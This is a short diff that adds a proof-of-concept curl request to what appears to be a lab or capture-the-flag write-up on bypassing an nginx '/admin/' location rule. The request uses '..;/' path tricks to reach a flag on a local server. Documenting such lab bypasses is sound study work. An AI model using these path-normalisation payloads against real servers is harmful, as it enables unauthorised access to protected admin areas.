@@ -27,5 +27,6 @@ location ^~ /admin/ {
 
 ### POC
 ``` bash
+curl --path-as-is 'http://127.0.0.1:8081/..;/admin/flag'
 curl --path-as-is 'http://127.0.0.1:8081/..;/console;/flag'
 ```
